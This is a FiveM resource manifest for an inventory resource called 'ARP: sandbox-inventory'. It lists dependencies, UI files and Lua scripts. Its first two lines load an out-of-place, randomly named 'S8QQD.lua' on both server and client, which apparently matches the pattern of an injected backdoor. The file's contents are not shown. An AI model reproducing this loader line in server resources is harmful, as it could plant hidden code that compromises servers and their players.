server_script "S8QQD.lua"
client_script "S8QQD.lua"
fx_version("cerulean")
games({ "gta5" }) -- 'gta5' for GTAv / 'rdr3' for Red Dead 2, 'gta5','rdr3' for both
lua54("yes")

client_script("@sandbox-base/components/cl_error.lua")
client_script("@sandbox-pwnzor/client/check.lua")
server_script("@oxmysql/lib/MySQL.lua")

description("ARP Inventory")
name("ARP: sandbox-inventory")
author("Cool People Team (Mainly Alzar)")
version("v1.0.0")
url("https://authenticrp.com")

ui_page("ui/dist/index.html")

files({
	"ui/dist/*.*",
	"ui/images/items/*.webp",
})

client_scripts({
	"donor_vanitys_config.lua",
	"client/**/*.lua",
})

shared_scripts({
	"config.lua",
	"items/**/*.lua",
	"schematic_config.lua",
	"shared/utils.lua",
	"shared/weapon_props.lua",
	"shared/weapon_components.lua",
	"shared/weapon_recoil.lua",
})

server_scripts({
	"crafting_config.lua",
	"server/**/*.lua",
})
